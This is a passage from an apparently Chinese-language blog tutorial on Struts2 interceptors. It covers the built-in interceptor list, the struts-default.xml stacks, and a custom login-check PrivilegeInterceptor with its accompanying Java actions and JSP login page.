class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;TestAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="内建拦截器"><a href="#内建拦截器" class="headerlink" title="内建拦截器"></a>内建拦截器</h2><p>拦截器都继承AbstractInterceptor</p><p>Struts2 框架中内置了许多拦截器，这些拦截器以 name-class 对的形式配置在 struts-default.xml 文件中，其中，name 是拦截器的名称，也就是引用的名字；class 指定了该拦截器所对应的实现。</p><p>只要自定义的包继承了 Struts2 的 struts-default 包，就可以使用包中定义的内建拦截器，否则需要自行定义拦截器。</p><p>内建拦截器介绍:</p><table><thead><tr><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>alias</td><td>在不同请求之间将请求参数在不同名称间转换，请求内容不变</td></tr><tr><td>autowiring</td><td>用于实现 Action 的自动装配</td></tr><tr><td>chain</td><td>让前一个 Action 的属性可以被后一个 Action 访问，现在和 chain 类型的 result() 结合使用</td></tr><tr><td>conversionError</td><td>将错误从 ActionContext 中添加到 Action 的属性字段中</td></tr><tr><td>cookies</td><td>使用配置的 Name 和 Value 指定 Cookies</td></tr><tr><td>cookieProvider</td><td>该类是一个 Cookie 工具，方便开发者向客户端写 Cookie</td></tr><tr><td>clearSession</td><td>用于清除一个 HttpSession 实例</td></tr><tr><td>createSession</td><td>自动创建 HttpSession，用于为需要使用</td></tr><tr><td>HttpSession</td><td>的拦截器服务</td></tr><tr><td>debugging</td><td>提供不同的调试用的页面展现内部的数据状况</td></tr><tr><td>execAndWait</td><td>在后台执行 Action，同时将用户带到一个中间的等待页面</td></tr><tr><td>exception</td><td>将异常定位到一个画面</td></tr><tr><td>fileUpload</td><td>提供文件上传功能</td></tr><tr><td>il8n</td><td>记录用户选择的 locale</td></tr><tr><td>logger</td><td>输出 Action 的名称</td></tr><tr><td>model-driven</td><td>如果一个类实现了 Model Driven，将 get Model 得到的结果放在 Value Slack 中</td></tr><tr><td>scoped-model-driven</td><td>如果一个 Action 实现了</td></tr><tr><td>params</td><td>将请求中的参数设置到 Action 中</td></tr><tr><td>actionMappingParams</td><td>用于负责在 Action 配置中传递参数</td></tr><tr><td>prepare</td><td>如果 Action 实现了 Preparable，则该拦截器调用 Action 类的 prepare 方法</td></tr><tr><td>staticParams</td><td>将 struts.xml 文件中 标签的参数内容设置到对应的 Action 中</td></tr><tr><td>scope</td><td>将 Action 状态存入 session 和 application 范围</td></tr><tr><td>servletConfig</td><td>提供访问 HttpServletRequest 和 HttpServletResponse 方法，以 Map 方式访问</td></tr><tr><td>timer</td><td>输岀 Action 执行的时间</td></tr><tr><td>token</td><td>通过 Token 避免双击</td></tr><tr><td>tokenSession</td><td>和 Token Interceptor 一样，不过双击时把请求的数据存储在 Session 中</td></tr><tr><td>validation</td><td>使用 action-validation.xml 文件中定义的内容校验提交的数据</td></tr><tr><td>workflow</td><td>调用 Action 的 validate 方法，一旦有错谋返回，则重新定位到 INPUT 画面</td></tr><tr><td>store</td><td>存储或者访问实现 ValidalionAware 接口的 Action 类出现的消息、错误和字段错误等</td></tr><tr><td>checkbox</td><td>添加了 checkbox 自动处理代码，将没有选中的 checkbox 的内容设定为 false，而 html 在默认情况下不提交没有选中的 checkbox</td></tr><tr><td>datetime</td><td>日期拦截器</td></tr><tr><td>profiling</td><td>通过参数激活 profile</td></tr><tr><td>roles</td><td>确定用户是否具有 JAAS 指定的 Role，否则不予执行</td></tr><tr><td>annotationWorkflow</td><td>利用注解代替 XML 配置</td></tr><tr><td>multiselect</td><td>检测是否有像 标签一样被选中的多个值，然后添加一个空参数</td></tr><tr><td>deprecation</td><td>当日志级别设置为调试模式（debug）并且没有特殊参数时，在 devMode</td></tr></tbody></table><p>在 struts-core-2.3.24.jar 包中的根目录下找到 struts-default.xml 文件，打开后找到 元素下的内建拦截器和拦截器栈，其部分代码如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts-default&quot;</span> <span class="hljs-attr">abstract</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span><br>    ...<br>    <span class="hljs-tag">&lt;<span class="hljs-name">interceptors</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--系统内建拦截器部分，上一部分介绍的内容--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.AliasInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;autowiring&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.spring.interceptor.ActionAutowiringInterceptor&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;chain&quot;</span></span><br><span class="hljs-tag">            <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.interceptor.ChainingInterceptor&quot;</span>/&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- 定义Basic stack拦截器栈 --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的exception拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!-- 定义Sample model -driven stack --&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDrivenStack&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的modelDriven拦截器--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;modelDriven&quot;</span>/&gt;</span><br>            <span class="hljs-comment">&lt;!--引用系统定义的basicStack拦截器栈--&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicStack&quot;</span>/&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>        ...<br>        <span class="hljs-comment">&lt;!--定义defaultStack拦截器栈--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-stack</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;exception&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;alias&quot;</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;il8n&quot;</span>/&gt;</span><br>            ...<br>            <span class="hljs-tag">&lt;<span class="hljs-name">interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;validation&quot;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">param</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;excludeMethods&quot;</span>&gt;</span>input,back,cancel,browse<span class="hljs-tag">&lt;/<span class="hljs-name">param</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-ref</span>&gt;</span><br>            ...<br>        <span class="hljs-tag">&lt;/<span class="hljs-name">interceptor-stack</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">interceptors</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--将defaulrStack拦截器栈配置为系统默认拦截器栈--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-interceptor-ref</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;defaultStack&quot;</span>/&gt;</span><br>    <span class="hljs-comment">&lt;!--默认action类是ActionSupport--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default-class-ref</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;com.opensymphony.xwork2.ActionSupport&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在上述内建拦截器的配置代码中，defaultStack 拦截器组合了多个拦截器，这些拦截器可以满足大部分 Web 应用程序的需求。使用时，只要在 struts.xml 定义包的过程中继承 struts-default 包，那么 defaultStack 拦截器栈就是默认拦截器的引用。</p><h2 id="自定义拦截器"><a href="#自定义拦截器" class="headerlink" title="自定义拦截器"></a>自定义拦截器</h2><p>   在实际的项目开发中，Struts2的内置拦截器可以完成大部分的拦截任务，但是，一些与系统逻辑相关的通用功能（如权限的控制、用户登录控制等），则需要通过自定义拦截器来实现，自定义拦截器其实就是开发自己的拦截器类。</p><p>自定义的拦截器类，需要实现import com.opensymphony.xwork2.interceptor.Interceptor接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">Interceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Serializable</span> </span>&#123;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>;<br> <br>    <span class="hljs-function">String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>该接口提供了以下三个方法：</p><ul><li><p>void init():该方法在拦截器被创建后会立即被调用，它在拦截器的生命周期内只被调用一-次。可以在该方法中对相关资源进行必要的初始化。</p></li><li><p>void destroy():该方法与init()方法相对应，在拦截器实例被销毁之前,将调用该方法来释放与拦截器相关的资源。它在拦截器的生命周期内也只被调用一次。</p></li><li><p>String intercept( ActionInvocation invocation) throws Exception: 该方法是拦截器的核心方法,用来添加真正执行拦截工作的代码，实现具体的拦截操作。它返回一个字符串作为逻辑视图，系统根据返回的字符串跳转到对应的视图资源。每拦截一个动作请求，该方法就会被调用一次。该方法的ActionInvocation参数包含了被拦截的Action的引用,可以通过该参数的invoke()方法,将控制权转给下一个拦截器或者转给Action的execute()方法。</p></li></ul><p>如果需要自定义拦截器,只需要实现Interceptor接口的三个方法即可。然而在实际开发过程中,除了实现Interceptor接口可以自定义拦截器外,更常用的一种方式是继承抽象拦截器类AbstractIntercepter。</p><p>该类实现了Interceptor 接口，并且提供了init()方法 和destroy()方法的空实现。使用时，可以直接继承该抽象类，而不用实现那些不必要的方法”拦截器类AbstractInterceptor中定义的方法</p><p>如下所示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AbstractInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Interceptor</span> </span>&#123;<br> <br>     <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;我是拦截器的初始化方法&quot;</span>);<br>    &#125;<br>   <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">destroy</span><span class="hljs-params">()</span> </span>&#123;<br>       System.out.println(<span class="hljs-string">&quot;我是拦截器的销毁方法&quot;</span>);<br>    &#125;<br> <br> <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    System.out.println(<span class="hljs-string">&quot;我是拦截器的拦截方法&quot;</span>);<br>        <span class="hljs-comment">//调用invoke()方法，代表着放行执行下一个拦截器，如果没有拦截器了，那么就执行Action的业务代码</span><br>        <span class="hljs-comment">//可看成是过滤器的doFilter()方法</span><br>        actionInvocation.invoke();<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>AbstractInterceptor类实现了Interceptor接口的所有方法，只需继承AbstractInterceptor类，实现interceptor()方法就可以创建自定义拦截器。</p><h2 id="使用拦截器实现权限控制"><a href="#使用拦截器实现权限控制" class="headerlink" title="使用拦截器实现权限控制"></a>使用拦截器实现权限控制</h2><p>自定义一个拦截器需要三步：</p><ol><li>自定义一个实现Interceptor接口（或者继承自AbstractInterceptor）的类。</li><li>在strutx.xml中注册上一步中定义的拦截器。</li><li>在需要使用的Action中引用上述定义的拦截器，为了方便也可将拦截器定义为默认的拦截器，这样在不加特殊声明的情况下所有的Action都被这个拦截器拦截。</li></ol><p>源代码如下：</p><p>User.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.domain;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123;<br><span class="hljs-keyword">private</span> String username; <span class="hljs-comment">//用户名</span><br><span class="hljs-keyword">private</span> String password; <span class="hljs-comment">//密码</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getUsername</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setUsername</span><span class="hljs-params">(String username)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.username = username;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getPassword</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> password;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setPassword</span><span class="hljs-params">(String password)</span> </span>&#123;<br><span class="hljs-keyword">this</span>.password = password;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User [username=&quot;</span> + username + <span class="hljs-string">&quot;, password=&quot;</span> + password + <span class="hljs-string">&quot;]&quot;</span>;<br>&#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>LoginAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> cn.itcast.domain.User;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ModelDriven;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoginAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ModelDriven</span>&lt;<span class="hljs-title">User</span>&gt; </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-keyword">private</span> User user = <span class="hljs-keyword">new</span> User();<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getModel</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">return</span> user;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><span class="hljs-comment">//获取ActionContext</span><br>ActionContext actionContext = ActionContext.getContext();<br>System.out.println(user);<br><span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;tom&quot;</span>.equals(user.getUsername())<br>&amp;&amp; <span class="hljs-string">&quot;123&quot;</span>.equals(user.getPassword())) &#123;<br><span class="hljs-comment">// 将用户存储在session中</span><br>actionContext.getSession().put(<span class="hljs-string">&quot;user&quot;</span>, user);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;用户名或密码不正确&quot;</span>);<br><span class="hljs-keyword">return</span> INPUT;<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>BookAction.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionSupport;<br><span class="hljs-meta">@SuppressWarnings(&quot;serial&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ActionSupport</span> </span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">add</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book add&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">del</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book del&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">update</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book update&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">find</span><span class="hljs-params">()</span> </span>&#123;<br>System.out.println(<span class="hljs-string">&quot;book find&quot;</span>);<br><span class="hljs-keyword">return</span> SUCCESS;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PrivilegeInterceptor.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.interceptor;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionContext;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.ActionInvocation;<br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.interceptor.AbstractInterceptor;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PrivilegeInterceptor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractInterceptor</span> </span>&#123;<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = <span class="hljs-number">1L</span>;<br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">intercept</span><span class="hljs-params">(ActionInvocation invocation)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>ActionContext actionContext = invocation.getInvocationContext();<span class="hljs-comment">// 得到ActionContext.</span><br>Object user = actionContext.getSession().get(<span class="hljs-string">&quot;user&quot;</span>);<span class="hljs-comment">//获取user对象</span><br><span class="hljs-keyword">if</span> (user != <span class="hljs-keyword">null</span>) &#123;<br><span class="hljs-keyword">return</span> invocation.invoke(); <span class="hljs-comment">// 继续向下执行</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>actionContext.put(<span class="hljs-string">&quot;msg&quot;</span>, <span class="hljs-string">&quot;您还未登录，请先登录&quot;</span>);<br><span class="hljs-keyword">return</span> Action.LOGIN; <span class="hljs-comment">//如果用户不存在，返回login值</span><br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>login.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>登录<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">center</span>&gt;</span><br>$&#123;requestScope.msg&#125;<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;login&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">table</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>用户名:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;text-align: right;&quot;</span>&gt;</span>密码:<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">td</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">tr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">td</span> <span class="hljs-attr">align</span>=<span class="hljs-string">&quot;right&quot;</span> <span class="hljs-attr">colspan</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span 